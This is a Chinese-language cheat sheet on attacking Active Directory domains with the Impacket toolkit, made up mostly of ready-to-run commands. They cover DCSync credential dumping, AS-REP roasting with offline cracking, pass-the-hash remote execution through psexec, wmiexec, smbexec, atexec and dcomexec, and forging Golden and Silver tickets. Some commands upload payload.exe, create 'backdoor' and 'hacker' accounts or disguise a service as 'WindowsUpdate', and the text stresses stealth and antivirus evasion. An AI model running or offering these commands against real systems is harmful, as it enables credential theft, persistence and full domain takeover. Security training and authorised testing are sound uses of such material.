### Impacket组件
>Impacket是一个用Python编写的网络协议库集合，专门用于处理网络数据包和协议。在域渗透中，它是最常用的工具之一。

- https://github.com/fortra/impacket

**核心特点：**
- 纯Python实现，跨平台支持
- 实现了多种Windows网络协议（SMB、MSRPC、Kerberos等）
- 无需在目标系统安装任何代理

  

### 常用脚本：

#### 凭证获取类：
- `secretsdump.py` ​ - 从域控制器或本地系统提取密码哈希、LSA secrets、缓存凭证等，支持    通过DCSync方式远程提取
- `GetNPUsers.py` ​ - 利用Kerberos预认证漏洞，获取不需要预认证的用户的TGT票据
- ​GetUserSPNs.py ​ - 执行Kerberoasting攻击，请求服务账户的TGS票据用于离线破解


#### 远程执行类：

•​psexec.py ​ - 通过SMB协议实现远程命令执行，类似于Sysinternals的PsExec•​wmiexec.py ​ - 使用WMI进行无文件的远程命令执行，更隐蔽
•​smbexec.py ​ - 通过SMB和任务计划程序执行命令
•atexec.py ​ - 使用任务计划服务执行命令•​dcomexec.py ​ - 利用DCOM对象执行命令

  

#### 信息收集类：

- ​GetADUsers.py ​ - 枚举域用户信息
- ​lookupsid.py ​ - 通过SID查找用户名，进行域枚举•​rpcdump.py ​ - 枚举RPC接口信息
- samrdump.py ​ - 通过SAMR协议转储用户信息

  

#### 其他工具：

- `​ticketer.py` ​ - 创建和伪造Kerberos票据（Golden/Silver Ticket）
- `​ntlmrelayx.py` ​ - NTLM中继攻击工具
- ​`smbclient.py` ​ - SMB客户端，用于文件操作

### 案例

- 账号的明文密码
- 账号的哈希值

#### secretsdump.py

  
```
# 案例 1：使用明文密码从域控提取所有用户哈希（DCSync）
secretsdump.py DOMAIN/administrator:Password123@192.168.1.10
secretsdump.py xq.xyz/administrator:Zxc12300.@192.168.30.10


# 案例 2：使用 NTLM 哈希进行 Pass-the-Hash 攻击提取凭证
secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c
administrator@192.168.1.10

# 案例 3：仅提取域内 krbtgt 账户（用于制作 Golden Ticket）
secretsdump.py DOMAIN/admin:password@192.168.1.10 -just-dc-user krbtgt

# 案例 4：从本地 SAM 数据库提取哈希（需要 SYSTEM 和 SAM 文件）
secretsdump.py -sam sam.save -system system.save LOCAL

# 案例 5：提取 NTDS.dit（域数据库）离线分析
secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# 案例 6：仅获取 NTLM 哈希，不获取 Kerberos 密钥（输出更清晰）
secretsdump.py DOMAIN/user:pass@192.168.1.10 -just-dc-ntlm

# 案例 7：使用 Kerberos 票据认证
export KRB5CCNAME=/tmp/administrator.ccache
secretsdump.py -k -no-pass DOMAIN/administrator@dc01.domain.com
```

#### GetNPUsers.py

利用AS-REP Roasting攻击，获取不需要Kerberos预认证的用户的TGT票据。
```bash
# 案例 1：枚举域内所有不需要预认证的用户
GetNPUsers.py DOMAIN/ -dc-ip 192.168.1.10 -request


# 案例 2：指定用户列表文件进行批量检查
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 192.168.1.10

# 案例 3：以域用户身份查询（更准确）
GetNPUsers.py DOMAIN/user:password -dc-ip 192.168.1.10 -request

# 案例 4：指定特定用户检查
GetNPUsers.py DOMAIN/testuser -no-pass -dc-ip 192.168.1.10


# 案例 5：输出为 Hashcat 格式用于破解
GetNPUsers.py DOMAIN/ -dc-ip 192.168.1.10 -request -format hashcat -outputfile
hashes.txt

# 案例 6：使用 NTLM 哈希认证查询
GetNPUsers.py DOMAIN/admin -hashes :8846f7eaee8fb117ad06bdd830b7586c -dc-ip
192.168.1.10
输出示例：
$krb5asrep$23$testuser@DOMAIN:a1b2c3d4e5f6...
```

后续破解：

```bash
hashcat -m 18200 hashes.txt wordlist.txt
john --format=krb5asrep hashes.txt --wordlist=rockyou.txt
```

#### psexec.py

- 在目标系统留下服务创建日志
- 需要管理员权限和开放 445 端口
- 会上传临时文件到目标系统

```bash
# 案例 1：基本命令执行
psexec.py DOMAIN/administrator:Password123@192.168.1.20
psexec.py xq.xyz/administrator:Zxc12300.@192.168.30.10
psexec.py xq.xyz/tom:qaz@123@192.168.30.20

# 案例 2：Pass-the-Hash 攻击
psexec.py -hashes 7ec128659901d71d91fe1f82db886cce tom@192.168.30.20

# 案例 3：执行单条命令后退出
psexec.py DOMAIN/admin:pass@192.168.1.20 "whoami"

# 案例 4：使用自定义共享路径（不使用 ADMIN$）
psexec.py DOMAIN/admin:pass@192.168.1.20 -share C$



# 案例 5：使用自定义服务名称（更隐蔽）
psexec.py DOMAIN/admin:pass@192.168.1.20 -service-name "WindowsUpdate"

# 案例 6：上传并执行本地可执行文件
psexec.py DOMAIN/admin:pass@192.168.1.20 -file payload.exe



# 案例 7：使用 Kerberos 认证
export KRB5CCNAME=/tmp/admin.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```


#### wmiexec.py
使用 WMI（Windows Management Instrumentation）进行无文件的远程命令执行。

- 无文件落地，更隐蔽
- 不创建服务
- 可以绕过某些杀软检测

```bash
# 案例 1：基本用法
wmiexec.py DOMAIN/administrator:Password123@192.168.1.20
wmiexec.py xq.xyz/administrator:Zxc12300.@192.168.30.10

# 案例 2：Pass-the-Hash
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.20

# 案例 3：执行单条命令
wmiexec.py xq.xyz/administrator:Zxc12300.@192.168.30.10 "ipconfig /all"

# 案例 4：使用自定义命名空间
wmiexec.py DOMAIN/admin:pass@192.168.1.20 -namespace "root\cimv2"

# 案例 5：不执行命令，只获取 shell
wmiexec.py DOMAIN/admin:pass@192.168.1.20 -shell-type powershell

# 案例 6：静默模式（无回显，更隐蔽）
wmiexec.py DOMAIN/admin:pass@192.168.1.20 -nooutput "net user hacker Pass123 /add"


# 案例 7：使用 Kerberos
wmiexec.py -k -no-pass DOMAIN/admin@target.domain.com
```

#### smbexec.py
通过 SMB 和任务计划程序执行命令，半交互式 shell
- 输出结果通过 SMB 共享回传
- 比 psexec 更隐蔽
- 每个命令创建新的批处理文件

```bash
# 案例 1：基本用法
smbexec.py DOMAIN/administrator:Password123@192.168.1.20
smbexec.py xq.xyz/administrator:Zxc12300.@192.168.30.10

# 案例 2：Pass-the-Hash
smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.20

# 案例 3：指定模式（SHARE 或 SERVER）
smbexec.py DOMAIN/admin:pass@192.168.1.20 -mode SERVER


# 案例 4：使用自定义共享
smbexec.py DOMAIN/admin:pass@192.168.1.20 -share-name "SharedDocs"

# 案例 5：执行 PowerShell 命令
smbexec.py DOMAIN/admin:pass@192.168.1.20 -shell-type powershell
```

#### atexec.py

通过任务计划服务（Task Scheduler）执行命令
- 通过 ITaskSchedulerService RPC 接口
- 适合执行单条命令
- 不提供交互式 shel

```bash
# 案例 1：执行单条命令
atexec.py xq.xyz/administrator:Zxc12300.@192.168.30.20 "whoami"

# 案例 2：Pass-the-Hash
atexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.20 "ipconfig"

# 案例 3：使用 Kerberos
atexec.py -k -no-pass DOMAIN/admin@target.domain.com "systeminfo"

# 案例 4：添加用户（无回显命令）
atexec.py DOMAIN/admin:pass@192.168.1.20 "net user backdoor Pass123! /add"
```

#### dcomexec.py
利用 DCOM（Distributed Component Object Model）对象执行命令

```bash
# 案例 1：使用 MMC20 对象（默认）
dcomexec.py xq.xyz/administrator:Zxc12300.@192.168.30.20

# 案例 2：使用 ShellWindows 对象
dcomexec.py DOMAIN/admin:pass@192.168.1.20 -object ShellWindows

# 案例 3：使用 ShellBrowserWindow 对象
dcomexec.py DOMAIN/admin:pass@192.168.1.20 -object ShellBrowserWindow

# 案例 4：Pass-the-Hash
dcomexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.20

# 案例 5：执行单条命令
dcomexec.py DOMAIN/admin:pass@192.168.1.20 "powershell -c Get-Process
```

#### GetADUsers.py
枚举 Active Directory 用户信息

```bash
# 案例 1：列出所有域用户
GetADUsers.py DOMAIN/user:password -dc-ip 192.168.1.10 -all

# 案例 2：仅列出用户名
GetADUsers.py DOMAIN/user:password -dc-ip 192.168.1.10

# 案例 3：使用 NTLM 哈希认证
GetADUsers.py -hashes :8846f7eaee8fb117ad06bdd830b7586c DOMAIN/admin -dc-ip 192.168.1.10 -all

# 案例 4：查询特定用户详细信息
GetADUsers.py DOMAIN/user:password -dc-ip 192.168.1.10 -user administrator

# 案例 5：使用 Kerberos 认证
GetADUsers.py -k -no-pass DOMAIN/user@dc01.domain.com -all
```
输出信息：
- 用户名、SID
- 描述信息
- 上次登录时间
- 密码过期信息
- 账户状态

#### ticketer.py

创建和伪造 Kerberos 票据（Golden Ticket / Silver Ticket）（黄金和白银票据）

```bash
# 案例 1：创建 Golden Ticket（域管理员）
ticketer.py -nthash d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3 \
-domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-domain DOMAIN.COM \
administrator

# 案例 2：创建 Silver Ticket（特定服务）
ticketer.py -nthash 8846f7eaee8fb117ad06bdd830b7586c \
-domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-domain DOMAIN.COM \
-spn cifs/server01.domain.com \
administrator

# 案例 3：指定用户 ID 和组
ticketer.py -nthash d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3 \
-domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-domain DOMAIN.COM \
-user-id 500 \
-groups 512,513,518,519,520 \
administrator

# 案例 4：使用 AES 密钥创建票据
ticketer.py -aesKey a1b2c3d4e5f6... \
-domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-domain DOMAIN.COM \
administrator

# 案例 5：设置票据有效期
ticketer.py -nthash d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3 \
-domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-domain DOMAIN.COM \
-duration 365 \
administrator
```
使用生成的票据：
```bash
export KRB5CCNAME=/path/to/administrator.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com

```

#### getST.py
请求 Kerberos 服务票据（Service Ticket）

```bash
# 案例 1：使用 TGT 获取服务票据
export KRB5CCNAME=/tmp/user.ccache
getST.py -k -no-pass -spn cifs/server01.domain.com DOMAIN/user

# 案例 2：S4U2Self 和 S4U2Proxy 攻击
getST.py -spn cifs/server01.domain.com \
-impersonate administrator \
DOMAIN/serviceaccount:password

# 案例 3：使用 NTLM 哈希
getST.py -spn http/web01.domain.com \
-hashes :8846f7eaee8fb117ad06bdd830b7586c \
DOMAIN/user

```
